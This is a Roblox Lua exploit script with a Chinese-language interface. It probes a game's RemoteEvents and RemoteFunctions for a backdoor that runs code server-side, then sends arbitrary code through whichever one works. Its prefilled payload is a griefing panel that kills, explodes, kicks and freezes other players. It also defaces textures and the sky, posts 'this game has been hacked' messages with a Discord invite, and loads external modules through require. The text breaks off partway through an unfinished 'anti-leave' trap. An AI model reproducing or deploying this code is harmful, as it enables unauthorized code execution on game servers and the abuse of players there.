 local ScreenGui= Instance.new("ScreenGui") ScreenGui.Name= "V6" ScreenGui.Parent= game:GetService("CoreGui").RobloxGui

local MainFrame = Instance.new("Frame") MainFrame.Size= UDim2.new(0, 400, 0, 300) MainFrame.Position= UDim2.new(0.5, -200, 0.5, -150) MainFrame.BackgroundColor3= Color3.fromRGB(35, 35, 35) MainFrame.BorderSizePixel= 0 MainFrame.Active= true MainFrame.Draggable= true MainFrame.Parent= ScreenGui

local CloseButton = Instance.new("TextButton") CloseButton.Size= UDim2.new(0, 20, 0, 20) CloseButton.Position= UDim2.new(1, -25, 0, 5) CloseButton.BackgroundColor3= Color3.fromRGB(200, 50, 50) CloseButton.TextColor3= Color3.fromRGB(255, 255, 255) CloseButton.Text= "X" CloseButton.Font= Enum.Font.SourceSansBold CloseButton.Parent= MainFrame

local InputBox = Instance.new("TextBox") InputBox.Size= UDim2.new(0, 380, 0, 200) InputBox.Position= UDim2.new(0, 10, 0, 30) InputBox.BackgroundColor3= Color3.fromRGB(25, 25, 25) InputBox.TextColor3= Color3.fromRGB(255, 255, 255) InputBox.Text= "" InputBox.TextWrapped= true InputBox.TextXAlignment= Enum.TextXAlignment.Left InputBox.TextYAlignment= Enum.TextYAlignment.Top InputBox.Parent= MainFrame

local ExecuteButton = Instance.new("TextButton") ExecuteButton.Size= UDim2.new(0, 185, 0, 40) ExecuteButton.Position= UDim2.new(0, 10, 0, 240) ExecuteButton.BackgroundColor3= Color3.fromRGB(80, 160, 80) ExecuteButton.TextColor3= Color3.fromRGB(255, 255, 255) ExecuteButton.Text= "执行" ExecuteButton.Font= Enum.Font.SourceSansBold ExecuteButton.Parent= MainFrame

local ClearButton = Instance.new("TextButton") ClearButton.Size= UDim2.new(0, 185, 0, 40) ClearButton.Position= UDim2.new(0, 205, 0, 240) ClearButton.BackgroundColor3= Color3.fromRGB(160, 80, 80) ClearButton.TextColor3= Color3.fromRGB(255, 255, 255) ClearButton.Text= "百吨王脚本" ClearButton.Font= Enum.Font.SourceSansBold ClearButton.Parent= MainFrame

local StatusLabel = Instance.new("TextLabel") StatusLabel.Size= UDim2.new(0, 100, 0, 20) StatusLabel.Position= UDim2.new(0, 10, 0, 5) StatusLabel.BackgroundTransparency= 1 StatusLabel.TextColor3= Color3.fromRGB(255, 255, 255) StatusLabel.Text= "未连接" StatusLabel.Font= Enum.Font.SourceSansBold StatusLabel.Parent= MainFrame

local attached = false local backdoor= nil local remoteCodes= {} local STRING_VALUE_NAME= tostring(math.random(1000000, 9999999))

local function scanDescendants(parent) local descendance = parent:GetDescendants() for i = 1, #descendance do local descendant = descendance[i] local class = descendant.ClassName
    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then
        continue
    end
    
    if descendant:IsDescendantOf(game:GetService("JointsService")) or 
       descendant:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
        continue
    end
    
    local remoteCode = tostring(math.random(100000, 999999))
    remoteCodes[remoteCode] = descendant
    
    local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
    
    if class == "RemoteEvent" then
        descendant:FireServer(requireScript)
    elseif class == "RemoteFunction" then
        pcall(function()
            descendant:InvokeServer(requireScript)
        end)
    end
    
    if game.Workspace:FindFirstChild(STRING_VALUE_NAME) then
        attached = true
        backdoor = remoteCodes[game.Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
        backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
        StatusLabel.Text = "已连接"
        StatusLabel.TextColor3 = Color3.fromRGB(95, 185, 47)
        return true
    end
end
return false

end

local function scanGame() local commonPlaces = { game:GetService("ReplicatedStorage"), game:GetService("Workspace"), game:GetService("Lighting") }
for i = 1, #commonPlaces do
    if scanDescendants(commonPlaces[i]) then
        return true
    end
end

local children = game:GetChildren()
for i = 1, #children do
    local child = children[i]
    local skip = false
    
    for j = 1, #commonPlaces do
        if child == commonPlaces[j] then
            skip = true
            break
        end
    end
    
    if not skip and scanDescendants(child) then
        return true
    end
end

return false
end

local function executeScript(script) if not attached then if scanGame() then executeScript(script) else StatusLabel.Text = "连接失败" StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50) end return end
if backdoor.ClassName == "RemoteEvent" then
    backdoor:FireServer(script)
elseif backdoor.ClassName == "RemoteFunction" then
    pcall(function()
        backdoor:InvokeServer(script)
    end)
end
end

ExecuteButton.MouseButton1Click:Connect(function() executeScript(InputBox.Text) end)

ClearButton.MouseButton1Click:Connect(function() InputBox.Text = [===[
if not _G.AdminPanel then
    _G.AdminPanel = {
        Created = false,
        ScreenGui = nil
    }
end
local function createAdminGUIForAxjx7()
    if _G.AdminPanel.Created and _G.AdminPanel.ScreenGui then
        _G.AdminPanel.ScreenGui:Destroy()
        _G.AdminPanel.Created = false
    end
    
    -- 查找玩家
    local targetPlayer = nil
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Name == "]===]..InputBox.Text[===[" then
            targetPlayer = player
            break
        end
    end
    
    if not targetPlayer then
        warn("玩家不在游戏中")
        return
    end
    
    -- 确保玩家有PlayerGui
    if not targetPlayer:FindFirstChild("PlayerGui") then
        Instance.new("PlayerGui").Parent = targetPlayer
    end
    
    -- 创建主屏幕GUI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AdminPanelGui"
    screenGui.Parent = targetPlayer.PlayerGui
    screenGui.ResetOnSpawn = false -- 确保不会在重生时重置
    screenGui.IgnoreGuiInset = true -- 忽略GUI插入
    
    -- 存储全局引用
    _G.AdminPanel.ScreenGui = screenGui
    _G.AdminPanel.Created = true
    
    -- 主容器框架
    local mainContainer = Instance.new("Frame")
    mainContainer.Size = UDim2.new(0, 350, 0, 300)  -- 减小高度
    mainContainer.Position = UDim2.new(0.5, -175, 0.5, -150)
    mainContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    mainContainer.BorderSizePixel = 0
    mainContainer.Active = true
    mainContainer.Draggable = true
    mainContainer.Parent = screenGui
    
    -- 添加圆角
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 8)
    containerCorner.Parent = mainContainer
    
    -- 添加阴影效果
    local containerShadow = Instance.new("UIStroke")
    containerShadow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    containerShadow.Color = Color3.fromRGB(20, 20, 25)
    containerShadow.Thickness = 2
    containerShadow.Parent = mainContainer
    
    -- 标题栏
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 40)
    titleBar.Position = UDim2.new(0, 0, 0, 0)
    titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainContainer
    
    -- 标题栏圆角（只圆顶角）
    local titleBarCorner = Instance.new("UICorner")
    titleBarCorner.CornerRadius = UDim.new(0, 8)
    titleBarCorner.Parent = titleBar
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 200, 1, 0)
    title.Position = UDim2.new(0, 15, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Axjx69 Gui V2.3"
    title.TextColor3 = Color3.fromRGB(220, 220, 220)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Font = Enum.Font.GothamSemibold
    title.TextSize = 16
    title.Parent = titleBar
    
    -- 窗口控制按钮容器
    local windowControls = Instance.new("Frame")
    windowControls.Size = UDim2.new(0, 70, 1, 0)
    windowControls.Position = UDim2.new(1, -70, 0, 0)
    windowControls.BackgroundTransparency = 1
    windowControls.Parent = titleBar
    
    -- 最小化按钮
    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Size = UDim2.new(0, 30, 1, 0)
    minimizeBtn.Position = UDim2.new(0, 0, 0, 0)
    minimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    minimizeBtn.BorderSizePixel = 0
    minimizeBtn.Text = "-"
    minimizeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    minimizeBtn.Font = Enum.Font.GothamBold
    minimizeBtn.TextSize = 16
    minimizeBtn.Parent = windowControls
    
    -- 最小化按钮悬停效果
    minimizeBtn.MouseEnter:Connect(function()
        minimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    end)
    
    minimizeBtn.MouseLeave:Connect(function()
        minimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    end)
    
    -- 关闭按钮
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 1, 0)
    closeBtn.Position = UDim2.new(0, 40, 0, 0)
    closeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "×"
    closeBtn.TextColor3 = Color3.fromRGB(220, 100, 100)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 18
    closeBtn.Parent = windowControls
    
    -- 关闭按钮悬停效果
    closeBtn.MouseEnter:Connect(function()
        closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
    
    closeBtn.MouseLeave:Connect(function()
        closeBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        closeBtn.TextColor3 = Color3.fromRGB(220, 100, 100)
    end)
    
    -- 内容区域
    local contentFrame = Instance.new("Frame")
    contentFrame.Size = UDim2.new(1, -20, 1, -60)
    contentFrame.Position = UDim2.new(0, 10, 0, 50)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Parent = mainContainer
    
    -- 创建滚动框架
    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, 0, 1, 0)
    scrollFrame.Position = UDim2.new(0, 0, 0, 0)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 6
    scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 65)
    scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y  -- 自动调整画布大小
    scrollFrame.Parent = contentFrame
    
    -- 全局变量用于存储音乐实例
    local currentMusic = nil
    
    -- 按钮功能列表 (使用原始功能)
    local buttonFunctions = {
        {
            name = "播放音乐1",
            func = function()
                local soundId = "rbxassetid://1848354536"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐2",
            func = function()
                local soundId = "rbxassetid://94074154650048"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐3",
            func = function()
                local soundId = "rbxassetid://119936139925486"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐4",
            func = function()
                local soundId = "rbxassetid://82996583445133"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐5",
            func = function()
                local soundId = "rbxassetid://140242130183594"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐6",
            func = function()
                local soundId = "rbxassetid://122761529841977"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐7",
            func = function()
                local soundId = "rbxassetid://74856563303589"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐8",
            func = function()
                local soundId = "rbxassetid://95231133674951"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐9",
            func = function()
                local soundId = "rbxassetid://6680801893"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐10",
            func = function()
                local soundId = "rbxassetid://15689446096"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐11",
            func = function()
                local soundId = "rbxassetid://6797864253"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐12",
            func = function()
                local soundId = "rbxassetid://9062549544"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐13",
            func = function()
                local soundId = "rbxassetid://16190783444"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐14",
            func = function()
                local soundId = "rbxassetid://15689451063"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐15",
            func = function()
                local soundId = "rbxassetid://95156028272944"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic.Pitch = 0.2
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐16",
            func = function()
                local soundId = "rbxassetid://1839246711"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "播放音乐17",
            func = function()
                local soundId = "rbxassetid://81704507776926"
                -- 如果已有音乐在播放，先停止
                if currentMusic then
                    currentMusic:Stop()
                    currentMusic:Destroy()
                end
                
                currentMusic = Instance.new("Sound")
                currentMusic.SoundId = soundId
                currentMusic.Looped = true
                currentMusic.Volume = 100
                currentMusic.Parent = workspace
                currentMusic:Play()
            end
        },
        {
            name = "暂停音乐",
            func = function()
                if currentMusic then
                    currentMusic:Stop()
                end
            end
        },
        {
    name = "回声效果",
    func = function()
        -- 遍历工作区中的所有声音实例
        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") then
                -- 移除可能已存在的回声效果
                for _, effect in ipairs(sound:GetChildren()) do
                    if effect:IsA("EchoSoundEffect") then
                        effect:Destroy()
                    end
                end
                
                -- 添加回声效果
                local echo = Instance.new("EchoSoundEffect")
                echo.Delay = 0.5  -- 回声延迟时间
                echo.Feedback = 0.7  -- 回声反馈强度
                echo.WetLevel = 0.5  -- 湿声级别
                echo.Parent = sound
            end
        end
        
        print("回声效果已应用到所有音乐")
    end
},
{
    name = "停止所有音乐",
    func = function()
        local stoppedCount = 0
        
        -- 遍历工作区中的所有声音实例
        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") then
                sound:Stop()
                stoppedCount = stoppedCount + 1
            end
        end
        
        print("已停止 " .. stoppedCount .. " 个音乐实例")
    end
},
        {
            name = "火焰效果",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "axjx_7" and player.Character then
                        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 10
                            fire.Parent = humanoidRootPart
                            
                            spawn(function()
                                while fire and fire.Parent do
                                    wait(1)
                                    local humanoid = player.Character:FindFirstChild("Humanoid")
                                    if humanoid and humanoid.Health > 0 then
                                        humanoid:TakeDamage(10)
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        },
        {
            name = "白天变黑夜",
            func = function()
                game.Lighting:SetMinutesAfterMidnight(0)
                game.Lighting.ClockTime = 0
            end
        },
        {
    name = "快速白夜更替",
    func = function()
        -- 全局变量来跟踪白夜更替状态
        if not _G.DayNightCycle then
            _G.DayNightCycle = {
                Active = false,
                Connection = nil
            }
        end
        
        local cycle = _G.DayNightCycle
        
        -- 如果循环正在进行，则停止
        if cycle.Active then
            cycle.Active = false
            if cycle.Connection then
                cycle.Connection:Disconnect()
                cycle.Connection = nil
            end
            print("白夜更替已停止")
            return
        end
        
        -- 开始白夜更替
        cycle.Active = true
        
        -- 设置初始时间
        local currentTime = 6 -- 从早上6点开始
        game.Lighting.ClockTime = currentTime
        
        -- 创建循环
        cycle.Connection = game:GetService("RunService").Heartbeat:Connect(function()
            if not cycle.Active then return end
            
            -- 每秒增加1小时（加速时间流逝）
            currentTime = currentTime + 0.03 -- 每帧增加0.03小时，大约每秒增加1小时
            
            -- 如果超过24小时，重置到0
            if currentTime >= 24 then
                currentTime = 0
            end
            
            -- 设置时间
            game.Lighting.ClockTime = currentTime
            
            -- 根据时间调整环境效果
            if currentTime >= 6 and currentTime < 18 then
                -- 白天效果
                game.Lighting.Brightness = 2
                game.Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
                game.Lighting.FogEnd = 1000
                game.Lighting.FogColor = Color3.fromRGB(191, 191, 191)
            else
                -- 夜晚效果
                game.Lighting.Brightness = 0.1
                game.Lighting.OutdoorAmbient = Color3.fromRGB(50, 50, 50)
                game.Lighting.FogEnd = 500
                game.Lighting.FogColor = Color3.fromRGB(30, 30, 40)
            end
        end)
        
        print("快速白夜更替已启动")
    end
},
        {
            name = "秒杀所有人",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "]===]..InputBox.Text[===[" and player.Character then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid.Health = 0
                        end
                    end
                end
            end
        },
{
    name = "所有人爆炸",
    func = function()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Name ~= "]===]..InputBox.Text[===[" and player.Character then
                local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    -- 创建爆炸效果
                    local explosion = Instance.new("Explosion")
                    explosion.Position = humanoidRootPart.Position
                    explosion.BlastPressure = 1000000
                    explosion.BlastRadius = 20
                    explosion.DestroyJointRadiusPercent = 0
                    explosion.Parent = workspace
                    
                    -- 对玩家造成伤害
                    local humanoid = player.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        humanoid:TakeDamage(50)
                    end
                    
                    -- 添加爆炸粒子效果
                    local fire = Instance.new("Fire")
                    fire.Size = 15
                    fire.Heat = 15
                    fire.Parent = humanoidRootPart
                    
                    delay(3, function()
                        fire:Destroy()
                    end)
                end
            end
        end
    end
},
{
    name = "所有人随机传送",
    func = function()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Name ~= "]===]..InputBox.Text[===[" and player.Character then
                local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    -- 生成随机位置
                    local randomX = math.random(-200, 200)
                    local randomY = math.random(10, 50)
                    local randomZ = math.random(-200, 200)
                    
                    -- 传送到随机位置
                    humanoidRootPart.CFrame = CFrame.new(randomX, randomY, randomZ)
                    
                    -- 添加传送特效
                    local teleportEffect = Instance.new("Part")
                    teleportEffect.Name = "TeleportEffect"
                    teleportEffect.Size = Vector3.new(5, 5, 5)
                    teleportEffect.Position = humanoidRootPart.Position
                    teleportEffect.Anchored = true
                    teleportEffect.CanCollide = false
                    teleportEffect.Transparency = 0.5
                    teleportEffect.BrickColor = BrickColor.new("Bright violet")
                    teleportEffect.Material = Enum.Material.Neon
                    teleportEffect.Parent = workspace
                    
                    -- 添加粒子效果
                    local particleEmitter = Instance.new("ParticleEmitter")
                    particleEmitter.Texture = "rbxassetid://75930818877094"
                    particleEmitter.Size = NumberSequence.new(1)
                    particleEmitter.Transparency = NumberSequence.new(0.5)
                    particleEmitter.Lifetime = NumberRange.new(1, 2)
                    particleEmitter.Rate = 50
                    particleEmitter.Speed = NumberRange.new(5, 10)
                    particleEmitter.Parent = teleportEffect
                    
                    -- 2秒后移除特效
                    delay(2, function()
                        teleportEffect:Destroy()
                    end)
                end
            end
        end
    end
},
        {
            name = "修改粒子",
            func = function()
                local particleId = "rbxassetid://75930818877094"
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("ParticleEmitter") then
                        obj.Texture = particleId
                    end
                end
            end
        },
        {
            name = "修改天空",
            func = function()
                for _, child in ipairs(game.Lighting:GetChildren()) do
                    if child:IsA("Sky") then
                        child:Destroy()
                    end
                end
                
                local sky = Instance.new("Sky")
                sky.Name = "CustomSky"
                
                local textureId = "rbxassetid://75930818877094"
                sky.SkyboxBk = textureId
                sky.SkyboxDn = textureId
                sky.SkyboxFt = textureId
                sky.SkyboxLf = textureId
                sky.SkyboxRt = textureId
                sky.SkyboxUp = textureId
                
                sky.Parent = game.Lighting
            end
        },
        {
            name = "修改全部贴图",
            func = function()
                local textureId = "rbxassetid://75930818877094"
                
                -- 修改所有部件的贴图和颜色
                for _, part in ipairs(workspace:GetDescendants()) do
                    if part:IsA("Part") then
                        -- 创建特殊材质
                        local texture = Instance.new("Texture")
                        texture.Texture = textureId
                        texture.Face = Enum.NormalId.Top
                        texture.Parent = part
                        
                        -- 修改颜色
                        part.BrickColor = BrickColor.new("Bright blue")
                        part.Material = Enum.Material.Neon
                    elseif part:IsA("Decal") then
                        part.Texture = textureId
                    end
                 end
            end
        },
        {
            name = "强制加入私人服务器",
            func = function()
                local playerList = game.Players:GetPlayers()
                local targetPlaceId = game.PlaceId
                
                for _, player in ipairs(playerList) do
                        local serverCode = game:GetService("HttpService"):GenerateGUID(false):sub(1, 8)
                        
                        local success, result = pcall(function()
                            return game:GetService("TeleportService"):ReserveServer(targetPlaceId)
                        end)
                        
                        if success then
                            local teleportSuccess, teleportError = pcall(function()
                                game:GetService("TeleportService"):TeleportToPrivateServer(
                                    targetPlaceId, 
                                    result, 
                                    {player}
                                )
                          end)
                      end
                  end
            end
        },
        {
            name = "踢出所有人",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "]===]..InputBox.Text[===[" then
                        player:Kick("无 和 空 白")
                    end
                end
            end
        },
        {
            name = "禁止移动",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "]===]..InputBox.Text[===[" and player.Character then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid.WalkSpeed = 0
                            humanoid.JumpPower = 0
                        end
                    end
                end
            end
        },
        {
            name = "恢复移动",
            func = function()
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Name ~= "]===]..InputBox.Text[===[" and player.Character then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid.WalkSpeed = 16
                            humanoid.JumpPower = 50
                        end
                    end
                end
            end
        },
        {
    name = "蓝小孩require脚本",
    func = function()
    require(17340805099).ez("]===]..InputBox.Text[===[")
    end
        },
        {
    name = "绿小孩require脚本",
    func = function()
    require(15267263357).V11("]===]..InputBox.Text[===[")
    end
        },
        {
    name = "anti skid",
    func = function()
    require(16534611190).AntiSkid()
    end
        },
        {
            name = "颜色反转",
            func = function()
                local function invertColor(color)
                    return Color3.new(1 - color.R, 1 - color.G, 1 - color.B)
                end
                
                for _, part in ipairs(workspace:GetDescendants()) do
                    if part:IsA("Part") then
                        part.BrickColor = BrickColor.new(invertColor(part.BrickColor.Color))
                    elseif part:IsA("Light") then
                        part.Color = invertColor(part.Color)
                    end
                end
            end
        },
        {
            name = "散发粒子",
            func = function()
                local particleId = "rbxassetid://75930818877094"
                
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Character then
                        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            local particleEmitter = Instance.new("ParticleEmitter")
                            particleEmitter.Texture = particleId
                            particleEmitter.Size = NumberSequence.new(0.3)
                            particleEmitter.Transparency = NumberSequence.new(0.5)
                            particleEmitter.Lifetime = NumberRange.new(2, 4)
                            particleEmitter.Rate = 70
                            particleEmitter.Speed = NumberRange.new(5, 10)
                            particleEmitter.Rotation = NumberRange.new(0, 360)
                            particleEmitter.Parent = humanoidRootPart
                        end
                    end
                end
            end
        },
        {
    name = "Message1",
    func = function()
    local message1 = Instance.new("Message")
        message1.Text = "AHAHAH"
        message1.Parent = workspace
        
        -- 6秒后移除消息
        delay(6, function()
            message1:Destroy()
        end)
    end
        },
        {
    name = "Message2",
    func = function()
    local message2 = Instance.new("Message")
        message2.Text = "这很诡异，你知道吗？"
        message2.Parent = workspace
        
        -- 6秒后移除消息
        delay(6, function()
            message2:Destroy()
        end)
    end
        },
        {
    name = "Message3",
    func = function()
    local message3 = Instance.new("Message")
        message3.Text = "69696969696969696969"
        message3.Parent = workspace
        
        -- 6秒后移除消息
        delay(6, function()
            message3:Destroy()
        end)
    end
        },
        {
    name = "Message4",
    func = function()
    local message4 = Instance.new("Message")
        message4.Text = "我爱69"
        message4.Parent = workspace
        
        -- 6秒后移除消息
        delay(6, function()
            message4:Destroy()
        end)
    end
        },
        {
    name = "Hint1",
    func = function()
    local Hint1 = Instance.new("Hint")
        Hint1.Text = "Axjx69现在已经入侵了这个游戏！！！"
        Hint1.Parent = workspace
        
        -- 6秒后移除消息
        delay(6, function()
            Hint1:Destroy()
        end)
    end
        },
        {
    name = "Hint2",
    func = function()
    local Hint2 = Instance.new("Hint")
        Hint2.Text = "对了你可以加入我们https://discord.gg/Uxtw7NZmKR"
        Hint2.Parent = workspace
        
        -- 6秒后移除消息
        delay(6, function()
            Hint2:Destroy()
        end)
    end
        },
        {
    name = "Hint3",
    func = function()
    local Hint3 = Instance.new("Hint")
        Hint3.Text = "Axjx69无和空白😇😇😇"
        Hint3.Parent = workspace
        
        -- 6秒后移除消息
        delay(6, function()
            Hint3:Destroy()
        end)
    end
        },
        {
    name = "插入反离开(没完善)",
    func = function()
        local Players = game:GetService("Players")
        local TPServ = game:GetService("TeleportService")
        local GuiServ = game:GetService("GuiService")
        local UIS = game:GetService("UserInputService")
        
        -- 为所有玩家创建反离开系统（包括axjx_7）
        for _, player in ipairs(Players:GetPlayers()) do
            -- 创建全屏GUI阻止离开，但初始时不可见
            local ucantleave = Instance.new("ScreenGui")
            local ImageLabel = Instance.new("ImageLabel")

            ucantleave.Name = "AntiLeaveGUI"
            ucantleave.Parent = player:WaitForChild("PlayerGui")
            ucantleave.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            ucantleave.DisplayOrder = 2147483647 -- 最高显示优先级
            ucantleave.Enabled = false -- 初始时禁用，不显示

            ImageLabel.Parent = ucantleave
            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ImageLabel.BackgroundTransparency = 0 -- 不透明
            ImageLabel.Size = UDim2.new(1, 0, 1, 0)
            ImageLabel.Image = "rbxassetid://75930818877094" -- 使用相同的图片ID

            -- 重新加入函数
            local function RejoinLol()
                -- 显示GUI
                ucantleave.Enabled = true
                
                pcall(function()
